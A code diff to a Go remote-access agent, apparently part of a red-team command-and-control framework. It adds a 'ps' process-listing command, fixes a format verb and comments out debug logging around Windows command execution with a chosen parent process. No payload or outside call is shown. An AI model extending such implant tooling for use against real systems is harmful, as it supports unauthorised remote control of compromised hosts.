@@ -206,7 +206,7 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 		message("info", fmt.Sprintf("\tUser GUID: %s", a.UserGUID))
 		message("info", fmt.Sprintf("\tHostname: %s", a.HostName))
 		message("info", fmt.Sprintf("\tPID: %d", a.Pid))
-		message("info", fmt.Sprintf("\tProcess: %d", a.Process))
+		message("info", fmt.Sprintf("\tProcess: %s", a.Process))
 		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
 		message("info", fmt.Sprintf("\tProtocol: %s", a.Proto))
 		message("info", fmt.Sprintf("\tProxy: %v", proxy))
@@ -983,6 +983,8 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 					c.Stdout = fmt.Sprintf("Changed working directory to %s", path)
 				}
 			}
+		case "ps":
+			c.Stdout, c.Stderr = a.ps()
 		case "pwd":
 			dir, err := os.Getwd()
 			if err != nil {
@@ -1071,11 +1073,11 @@ func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr str
 }
 
 func (a *Agent) winExecute(j messages.WinExecute) (stdout string, stderr string) {
-	if a.Debug {
-		message("debug", fmt.Sprintf("Received input parameter for winExecute function: %s", j))
-	} else if a.Verbose {
-		message("success", fmt.Sprintf("Executing windowscommand %s %s with ppid %s", j.Command, j.Args, j.Ppid))
-	}
+	//if a.Debug {
+	//message("debug", fmt.Sprintf("Received input parameter for winExecute function: %s\n", j))
+	//} else if a.Verbose {
+	//message("success", fmt.Sprintf("Executing windows command %s %s with ppid %n\n", j.Command, j.Args, j.Ppid))
+	//}
 
 	stdout, stderr = WinExec(j.Command, j.Args, j.Ppid)
 
@@ -1107,6 +1109,29 @@ func (a *Agent) ifconfig() (stdout string, stderr string) {
 	if a.Verbose {
 		if stderr != "" {
 			message("warn", fmt.Sprintf("There was an error executing ifconfig"))
+			message("success", stdout)
+			message("warn", fmt.Sprintf("Error: %s", stderr))
+
+		} else {
+			message("success", stdout)
+		}
+	}
+	return stdout, stderr
+}
+
+// Functionality is split between Windows and non-windows because extra API calls need to be made
+func (a *Agent) ps() (stdout string, stderr string) {
+	if a.Debug {
+		message("debug", fmt.Sprintf("Running ps function"))
+	} else if a.Verbose {
+		message("success", fmt.Sprintf("Executing ps function"))
+	}
+
+	stdout, stderr = Ps()
+
+	if a.Verbose {
+		if stderr != "" {
+			message("warn", fmt.Sprintf("There was an error executing ps"))
 			message("success", stdout)
 			message("warn", fmt.Sprintf("Error: %s", stderr))
 
